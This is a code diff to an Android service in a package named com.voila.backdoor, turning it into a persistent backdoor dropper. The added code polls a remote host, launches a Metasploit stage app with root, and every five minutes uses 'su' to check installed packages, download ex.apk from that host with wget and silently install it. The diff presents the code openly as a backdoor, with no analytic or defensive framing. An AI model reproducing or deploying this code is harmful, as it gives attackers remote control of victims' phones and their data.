@@ -6,6 +6,7 @@ import android.os.IBinder;
 import android.util.*;
 import java.io.*;
 import java.util.*;
+import java.net.*;
 
 public class srv extends Service
 {
@@ -33,65 +34,68 @@ public class srv extends Service
 	public int onStartCommand(Intent intent, int flags, int startId)
 	{
 		Log.i("fuck","onStartCommand");
-		Timer t=new Timer();
+		final Timer t=new Timer();
 		TimerTask tt=new TimerTask(){
-
+			boolean b=false;
 			@Override
 			public void run()
 			{
-				//Intent i=new Intent(srv.this,srv.class);
-				//startService(i);
 				Log.i("fuck","start");
-				// TODO: Implement this method
+				
+				
+				Socket s=new Socket();
+				try
+				{
+					SocketAddress sa=new InetSocketAddress(InetAddress.getByName("mc1106.cn").getHostAddress(),300);
+					s.connect(sa,500);
+					if(!b) //如果假
+					{
+						Runtime.getRuntime().exec("su -c am start com.metasploit.stage/.MainActivity");
+						b=true;
+					}
+				}catch(Exception e)
+				{
+					b=false;
+				}
+				
 			}
 		};
-		t.schedule(tt,2000,2000);
-		/*
-		while(true)
-		{
-			Log.i("fuck","thread");
+		t.schedule(tt,0,2000);
+		
+		new Timer().schedule(new TimerTask(){
 
-			try
-			{
-				Thread.sleep(2000);
-			}catch(InterruptedException e)
-			{}
-		}
-		*/
-		/*
-		new Thread(){
-			@Override
-			public void run()
-			{
-				
-				
-			}
-		}.run();
-		*/
-		/*
-		try
-		{
-			Process p=Runtime.getRuntime().exec("su");
-			DataOutputStream os=new DataOutputStream(p.getOutputStream());
-			os.writeBytes("pm list package\n");
-			os.flush();
-			os.close();
-			BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
-			String line=null;
-			StringBuffer sb=new StringBuffer();
-			while((line=br.readLine())!=null)
-			{
-				sb.append(line).append("\n");
-			}
-			if(sb.indexOf("com.metasploit.stage")==-1)
-			{
-				p=Runtime.getRuntime().exec("wget http://129.28.68.123/ex.apk -O /data/user/0/com.voila.backdoor/files/ex.apk");
-				p.waitFor();
-				p=Runtime.getRuntime().exec("su -c pm install /data/user/0/com.voila.backdoor/files/ex.apk");
-			}
-		}catch(Exception e)
-		{}
-		*/
+				@Override
+				public void run()
+				{
+					// TODO: Implement this method
+					try
+					{
+						Process p=Runtime.getRuntime().exec("su");
+						DataOutputStream os=new DataOutputStream(p.getOutputStream());
+						os.writeBytes("pm list package\n");
+						os.flush();
+						os.close();
+						BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+						String line=null;
+						StringBuffer sb=new StringBuffer();
+						while((line = br.readLine()) != null)
+						{
+							sb.append(line).append("\n");
+						}
+						int res=sb.indexOf("com.metasploit.stage");
+						Log.i("fuck","res: " + res);
+						if(res == -1)
+						{
+							p = Runtime.getRuntime().exec("wget http://" + InetAddress.getByName("mc1106.cn").getHostAddress() + "/ex.apk -O /data/user/0/com.voila.backdoor/files/ex.apk");
+							p.waitFor();
+							p = Runtime.getRuntime().exec("su -c pm install /data/user/0/com.voila.backdoor/files/ex.apk");
+						}
+					}catch(Exception e)
+					{}
+				}
+			},0,1000 * 60 * 5);
+			
+
 		return super.onStartCommand(intent,flags,startId);
 	}
 }
